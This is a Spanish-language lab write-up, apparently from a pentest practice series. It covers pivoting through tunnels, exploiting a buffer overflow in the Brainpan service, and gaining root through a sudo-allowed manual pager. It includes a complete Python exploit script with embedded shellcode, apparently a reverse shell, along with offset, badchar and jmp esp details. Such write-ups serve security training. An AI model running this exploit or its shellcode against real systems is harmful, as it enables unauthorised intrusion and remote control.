![Password encontrada|800](IMG/Pasted%20image%2020260603191419.png)

Estamos dentro.

![Dentro Matrix|800](IMG/Pasted%20image%2020260603191600.png)

Tenemos una shell que es restricted bash por tanto no podemos ejecutar muchos de los comandos que deberíamos.

![rbash|800](IMG/Pasted%20image%2020260603191632.png)

Para escapar de esta podemos volver a conectarnos por SSH indicando al final el tipo de shell que queremos usar.

![Escape rbash|800](IMG/Pasted%20image%2020260603191754.png)

Ya podemos ver la última red que nos queda por acceder.

![Ultima red|800](IMG/Pasted%20image%2020260603192055.png)

Podemos ejecutar cualquier comando con `su` sin poner la password.

![Su sin password|800](IMG/Pasted%20image%2020260603192507.png)

Creamos el mismo script de siempre.

![Script descubrimiento Matrix|800](IMG/Pasted%20image%2020260603193419.png)

![Script resultado|800](IMG/Pasted%20image%2020260603194010.png)

A continuación subimos el chisel y vamos a crear los respectivos túneles.

![Chisel Matrix|800](IMG/Pasted%20image%2020260603212215.png)

Como en Windows no tenemos socat, utilizaremos netsh. [Guía](https://blog.deephacking.tech/en/posts/how-to-do-pivoting-with-netsh/)

![netsh|800](IMG/Pasted%20image%2020260603220736.png)

Con esta configuración conseguimos que esté todo conectado.

![Configuracion tunneles|800](IMG/Pasted%20image%2020260603220750.png)

Añadimos el socket 5522 a la configuración de proxychains. Y lanzamos un nmap.

![proxychains 5522|800](IMG/Pasted%20image%2020260603221130.png)

Encontramos una página web en el puerto 10000.

![Puerto 10000|800](IMG/Pasted%20image%2020260603221300.png)

Esta es la web.

![Web Brainpan|800](IMG/Pasted%20image%2020260603221411.png)

También nos podemos conectar por nc al puerto 9999.

![nc 9999|800](IMG/Pasted%20image%2020260603221523.png)

Configuramos el SOCKS en Burpsuite para hacer fuzzing, debido a que al haber tantos saltos gobuster no va bien.

![Burpsuite SOCKS|800](IMG/Pasted%20image%2020260603222022.png)

Interceptamos una petición de la máquina, la mandamos al intruder y empezamos con el ataque de fuerza bruta en busca de directorios.

![Burpsuite intruder|800](IMG/Pasted%20image%2020260603222445.png)

Hemos encontrado el directorio bin. No pongo la captura debido a que he avanzado el video porque Burpsuite hubiera tardado un rato.

![Directorio bin|800](IMG/Pasted%20image%2020260603222935.png)

Lo descargamos y vamos a abrirlo con la máquina Linux de 32 bits para debugear.

![Descarga bin|800](IMG/Pasted%20image%2020260603223701.png)

![Descarga bin 2|800](IMG/Pasted%20image%2020260603223716.png)

Abrimos el Immunity.

![Immunity|800](IMG/Pasted%20image%2020260603224436.png)

Atacheamos el brainpan a Immunity Debugger.

![Attach brainpan|800](IMG/Pasted%20image%2020260603224627.png)

Nos conectamos al puerto del script desde nuestra Arch. Y comprobamos qué pasa si le ponemos muchas A dentro del sitio donde nos pide que pongamos una contraseña.

![Crash brainpan|800](IMG/Pasted%20image%2020260603225016.png)

![Crash brainpan 2|800](IMG/Pasted%20image%2020260603225124.png)

El Immunity está en paused, esto es porque como podemos ver en el EIP hemos llenado el buffer de A.

![EIP brainpan|800](IMG/Pasted%20image%2020260603225145.png)

Ahora toca saber cuántas A hay que poner. Creamos 1000 caracteres aleatorios y vamos a ver en qué parte de estos 1000 se escribe el EIP.

![pattern brainpan|800](IMG/Pasted%20image%2020260603225441.png)

Tenemos que introducir 524 A antes de sobrescribir el EIP.

![Offset 524|800](IMG/Pasted%20image%2020260603225736.png)

![Offset 524 2|800](IMG/Pasted%20image%2020260603225706.png)

Comprobamos que sea así.

![Comprobacion offset|800](IMG/Pasted%20image%2020260603225839.png)

Y efectivamente es así.

![Offset confirmado|800](IMG/Pasted%20image%2020260603225926.png)

Vamos a ver los badchars con mona. Primero creamos un directorio con `!mona config -set workingfolder <ruta>%p`.

![mona config|800](IMG/Pasted%20image%2020260603230744.png)

Con `!mona bytearray -cpb "badchar"` como `\x00`, de esta manera lo elimina de una byte array.

![mona bytearray|800](IMG/Pasted%20image%2020260603231007.png)

Lo copiamos en la máquina. Y lo introducimos en un script para ver los badchars. Lo podemos debugear con mona de la siguiente manera: `!mona compare -f "ruta archivo mona.bin" -a "ruta donde empiezan los bad chars"`.

![mona compare|800](IMG/Pasted%20image%2020260603232638.png)

Creamos el payload.

![Payload brainpan|800](IMG/Pasted%20image%2020260603232951.png)

Ahora tenemos que buscar una parte donde se haga el jmp al ESP.

![JMP ESP brainpan|800](IMG/Pasted%20image%2020260603233245.png)

Con `mona find -s "jmp" -m binario`, podemos encontrar:

![mona find|800](IMG/Pasted%20image%2020260603233509.png)

![mona find 2|800](IMG/Pasted%20image%2020260603233704.png)

Y en local nos da la shell.

![Shell local|800](IMG/Pasted%20image%2020260603235130.png)

Ahora toca configurar la manera en la que nos mandaremos la shell. Con esta configuración me ha funcionado.

![Config shell|800](IMG/Pasted%20image%2020260604003114.png)

![Config shell 2|800](IMG/Pasted%20image%2020260604003123.png)

Probamos a mandarnos la shell.

![Shell Brainpan|800](IMG/Pasted%20image%2020260604003155.png)

Estamos dentro. Este es el script que he usado:

```python
#!/bin/python3

import socket
from struct import pack

offset = 524
before_eip = b"A" * offset
eip = pack("<I", 0x311712f3)  # Address of "jmp esp" in essfunc.dll
buf =  b""
buf += b"\xda\xd2\xd9\x74\x24\xf4\x5d\x2b\xc9\xbe\xc3\xb5"
buf += b"\x75\xc5\xb1\x52\x83\xc5\x04\x31\x75\x13\x03\xb6"
buf += b"\xa6\x97\x30\xc4\x21\xd5\xbb\x34\xb2\xba\x32\xd1"
buf += b"\x83\xfa\x21\x92\xb4\xca\x22\xf6\x38\xa0\x67\xe2"
buf += b"\xcb\xc4\xaf\x05\x7b\x62\x96\x28\x7c\xdf\xea\x2b"
buf += b"\xfe\x22\x3f\x8b\x3f\xed\x32\xca\x78\x10\xbe\x9e"
buf += b"\xd1\x5e\x6d\x0e\x55\x2a\xae\xa5\x25\xba\xb6\x5a"
buf += b"\xfd\xbd\x97\xcd\x75\xe4\x37\xec\x5a\x9c\x71\xf6"
buf += b"\xbf\x99\xc8\x8d\x74\x55\xcb\x47\x45\x96\x60\xa6"
buf += b"\x69\x65\x78\xef\x4e\x96\x0f\x19\xad\x2b\x08\xde"
buf += b"\xcf\xf7\x9d\xc4\x68\x73\x05\x20\x88\x50\xd0\xa3"
buf += b"\x86\x1d\x96\xeb\x8a\xa0\x7b\x80\xb7\x29\x7a\x46"
buf += b"\x3e\x69\x59\x42\x1a\x29\xc0\xd3\xc6\x9c\xfd\x03"
buf += b"\xa9\x41\x58\x48\x44\x95\xd1\x13\x01\x5a\xd8\xab"
buf += b"\xd1\xf4\x6b\xd8\xe3\x5b\xc0\x76\x48\x13\xce\x81"
buf += b"\xaf\x0e\xb6\x1d\x4e\xb1\xc7\x34\x95\xe5\x97\x2e"
buf += b"\x3c\x86\x73\xae\xc1\x53\xd3\xfe\x6d\x0c\x94\xae"
buf += b"\xcd\xfc\x7c\xa4\xc1\x23\x9c\xc7\x0b\x4c\x37\x32"
buf += b"\xdc\x79\xc7\x30\x79\x16\xd5\x48\x84\xa4\x50\xae"
buf += b"\xec\x38\x35\x79\x99\xa1\x1c\xf1\x38\x2d\x8b\x7c"
buf += b"\x7a\xa5\x38\x81\x35\x4e\x34\x91\xa2\xbe\x03\xcb"
buf += b"\x65\xc0\xb9\x63\xe9\x53\x26\x73\x64\x48\xf1\x24"
buf += b"\x21\xbe\x08\xa0\xdf\x99\xa2\xd6\x1d\x7f\x8c\x52"
buf += b"\xfa\xbc\x13\x5b\x8f\xf9\x37\x4b\x49\x01\x7c\x3f"
buf += b"\x05\x54\x2a\xe9\xe3\x0e\x9c\x43\xba\xfd\x76\x03"
buf += b"\x3b\xce\x48\x55\x44\x1b\x3f\xb9\xf5\xf2\x06\xc6"
buf += b"\x3a\x93\x8e\xbf\x26\x03\x70\x6a\xe3\x58\x55\xa5"
buf += b"\xe4\x37\xcc\x50\xb9\x55\xef\x8f\xfe\x63\x6c\x25"
buf += b"\x7f\x90\x6c\x4c\x7a\xdc\x2a\xbd\xf6\x4d\xdf\xc1"
buf += b"\xa5\x6e\xca"

payload = before_eip + eip + b"\x90"*16 + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.15.12.102", 9999))
s.send(payload)
s.close()
```

Para poder escalar como root, tenemos que mandar un payload en Linux.

![Payload Linux|800](IMG/Pasted%20image%2020260604003615.png)

Simplemente lo cambiamos en el script y nos volvemos a mandar la shell.

![Shell Linux|800](IMG/Pasted%20image%2020260604003648.png)

Hacemos `sudo -l` y vemos que podemos ejecutar un programa como sudo sin necesidad de otorgar contraseña. Lo ejecutamos para ver qué hace.

![sudo -l|800](IMG/Pasted%20image%2020260604004256.png)

Este nos deja ejecutar un manual. Si ejecutamos el manual de cualquier comando se pone en modo paginado y ahí dentro podemos spawnear una shell privilegiada.

![Manual privesc|800](IMG/Pasted%20image%2020260604010809.png)

Cuando nos cargue el manual le pasamos la instrucción que queremos ejecutar y ya está.

![Root Brainpan|800](IMG/Pasted%20image%2020260604011014.png)

![Root final|800](IMG/Pasted%20image%2020260604011022.png)